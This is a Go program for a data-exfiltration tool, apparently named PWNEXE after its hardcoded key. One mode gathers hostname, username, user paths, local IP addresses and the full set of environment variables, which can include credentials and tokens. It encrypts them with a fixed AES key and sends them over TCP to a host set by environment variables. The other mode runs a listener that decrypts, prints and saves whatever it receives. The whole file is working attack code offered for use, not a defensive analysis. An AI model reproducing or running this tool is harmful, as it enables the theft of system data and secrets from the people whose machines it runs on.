package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
)

type SystemData struct {
	Timestamp   int64             `json:"timestamp"`
	Hostname    string            `json:"hostname"`
	Username    string            `json:"username"`
	ComputerName string           `json:"computername"`
	UserProfile string            `json:"userprofile"`
	SystemRoot  string            `json:"systemroot"`
	ProgramFiles string           `json:"programfiles"`
	LocalIPs    []string          `json:"local_ips"`
	CurrentDir  string            `json:"current_dir"`
	Environment map[string]string `json:"environment"`
	Processes   []string          `json:"processes"`
}

var encryptionKey []byte

func init() {
	// Generate a fixed encryption key for consistency
	key := "PWNEXE_SECRET_KEY_2024"
	hash := make([]byte, 32)
	for i := 0; i < 32; i++ {
		hash[i] = key[i%len(key)]
	}
	encryptionKey = hash
}

func encrypt(data []byte) ([]byte, error) {
	block, err := aes.NewCipher(encryptionKey)
	if err != nil {
		return nil, err
	}
	
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	
	return gcm.Seal(nonce, nonce, data, nil), nil
}

func decrypt(data []byte) ([]byte, error) {
	block, err := aes.NewCipher(encryptionKey)
	if err != nil {
		return nil, err
	}
	
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	
	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

func collectSystemData() *SystemData {
	data := &SystemData{
		Timestamp:   time.Now().Unix(),
		Environment: make(map[string]string),
	}
	
	// Basic system info
	data.Hostname, _ = os.Hostname()
	data.Username = os.Getenv("USERNAME")
	data.ComputerName = os.Getenv("COMPUTERNAME")
	data.UserProfile = os.Getenv("USERPROFILE")
	data.SystemRoot = os.Getenv("SYSTEMROOT")
	data.ProgramFiles = os.Getenv("PROGRAMFILES")
	data.CurrentDir, _ = os.Getwd()
	
	// Environment variables
	for _, env := range os.Environ() {
		pair := strings.SplitN(env, "=", 2)
		if len(pair) == 2 {
			data.Environment[pair[0]] = pair[1]
		}
	}
	
	// Network interfaces
	addrs, err := net.InterfaceAddrs()
	if err == nil {
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if ipnet.IP.To4() != nil {
					data.LocalIPs = append(data.LocalIPs, ipnet.IP.String())
				}
			}
		}
	}
	
	// Simplified process list (just a placeholder)
	data.Processes = []string{"system_data_collected"}
	
	return data
}

func sendDataToTarget(targetIP, targetPort string) error {
	// Collect system data
	systemData := collectSystemData()
	
	// Convert to JSON
	jsonData, err := json.Marshal(systemData)
	if err != nil {
		return fmt.Errorf("failed to marshal data: %v", err)
	}
	
	// Encrypt the data
	encryptedData, err := encrypt(jsonData)
	if err != nil {
		return fmt.Errorf("failed to encrypt data: %v", err)
	}
	
	// Connect to target
	conn, err := net.Dial("tcp", targetIP+":"+targetPort)
	if err != nil {
		return fmt.Errorf("failed to connect to %s:%s: %v", targetIP, targetPort, err)
	}
	defer conn.Close()
	
	// Send data length first (8 bytes)
	dataLen := len(encryptedData)
	lenBytes := make([]byte, 8)
	for i := 0; i < 8; i++ {
		lenBytes[i] = byte(dataLen >> (i * 8))
	}
	
	_, err = conn.Write(lenBytes)
	if err != nil {
		return fmt.Errorf("failed to send data length: %v", err)
	}
	
	// Send the encrypted data
	_, err = conn.Write(encryptedData)
	if err != nil {
		return fmt.Errorf("failed to send data: %v", err)
	}
	
	fmt.Printf("[+] Data sent successfully to %s:%s (%d bytes)\n", targetIP, targetPort, len(encryptedData))
	return nil
}

func startReceiver(port string) {
	listener, err := net.Listen("tcp", ":"+port)
	if err != nil {
		log.Fatalf("Failed to start listener: %v", err)
	}
	defer listener.Close()
	
	fmt.Printf("[+] Data receiver started on port %s\n", port)
	fmt.Printf("[+] Waiting for incoming data...\n")
	
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Printf("[-] Failed to accept connection: %v\n", err)
			continue
		}
		
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()
	
	fmt.Printf("[+] New connection from %s\n", conn.RemoteAddr().String())
	
	// Read data length (8 bytes)
	lenBytes := make([]byte, 8)
	_, err := io.ReadFull(conn, lenBytes)
	if err != nil {
		fmt.Printf("[-] Failed to read data length: %v\n", err)
		return
	}
	
	// Convert length bytes to int
	var dataLen int64
	for i := 0; i < 8; i++ {
		dataLen |= int64(lenBytes[i]) << (i * 8)
	}
	
	// Read the encrypted data
	encryptedData := make([]byte, dataLen)
	_, err = io.ReadFull(conn, encryptedData)
	if err != nil {
		fmt.Printf("[-] Failed to read data: %v\n", err)
		return
	}
	
	// Decrypt the data
	decryptedData, err := decrypt(encryptedData)
	if err != nil {
		fmt.Printf("[-] Failed to decrypt data: %v\n", err)
		return
	}
	
	// Parse JSON data
	var systemData SystemData
	err = json.Unmarshal(decryptedData, &systemData)
	if err != nil {
		fmt.Printf("[-] Failed to parse JSON: %v\n", err)
		return
	}
	
	// Display the received data
	fmt.Printf("\n[+] Received system data from %s:\n", conn.RemoteAddr().String())
	fmt.Printf("    Timestamp: %s\n", time.Unix(systemData.Timestamp, 0).Format("2006-01-02 15:04:05"))
	fmt.Printf("    Hostname: %s\n", systemData.Hostname)
	fmt.Printf("    Username: %s\n", systemData.Username)
	fmt.Printf("    Computer Name: %s\n", systemData.ComputerName)
	fmt.Printf("    User Profile: %s\n", systemData.UserProfile)
	fmt.Printf("    System Root: %s\n", systemData.SystemRoot)
	fmt.Printf("    Program Files: %s\n", systemData.ProgramFiles)
	fmt.Printf("    Current Directory: %s\n", systemData.CurrentDir)
	fmt.Printf("    Local IPs: %v\n", systemData.LocalIPs)
	fmt.Printf("    Environment Variables: %d items\n", len(systemData.Environment))
	fmt.Printf("    Processes: %v\n", systemData.Processes)
	
	filename := fmt.Sprintf("received_data_%s.json", time.Now().Format("20060102_150405"))
	err = ioutil.WriteFile(filename, decryptedData, 0644)
	if err != nil {
		fmt.Printf("[-] Failed to save data to file: %v\n", err)
	} else {
		fmt.Printf("[+] Data saved to %s\n", filename)
	}
	
	fmt.Println()
}

func main() {
	if len(os.Args) > 1 && os.Args[1] == "receive" {
		port := "9000"
		if len(os.Args) > 2 {
			port = os.Args[2]
		}
		startReceiver(port)
		return
	}
	
	targetIP := "127.0.0.1"
	targetPort := "9000"
	
	if envIP := os.Getenv("TARGET_IP"); envIP != "" {
		targetIP = envIP
	}
	if envPort := os.Getenv("TARGET_PORT"); envPort != "" {
		targetPort = envPort
	}
	
	fmt.Printf("[*] Starting data exfiltration to %s:%s\n", targetIP, targetPort)
	
	err := sendDataToTarget(targetIP, targetPort)
	if err != nil {
		fmt.Printf("[-] Failed to send data: %v\n", err)
		os.Exit(1)
	}
	
	fmt.Println("[+] Data exfiltration completed successfully")
}
